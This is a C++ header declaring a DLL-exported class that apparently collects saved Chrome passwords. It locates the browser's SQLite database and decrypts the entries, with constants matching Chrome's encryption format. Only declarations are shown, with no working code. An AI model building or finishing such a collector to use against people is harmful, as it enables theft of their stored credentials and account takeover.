#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include "ChromeCollecter.h"

#include <string>
#include <vector>

#include "common.h"

#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12



class  EXPORT_F ChromePasswordCollecter : public ChromeCollecter<userData>
{	
public:
	ChromePasswordCollecter(): ChromeCollecter<userData>(){}
	~ChromePasswordCollecter()  {};
	List<userData> collectData() override;

protected:
	void collectFromPath(const String& chromePath) override;
    bool getDbPath(const String& chromePath) override;
	ChromeDecrypt m_decryptor;

};

 

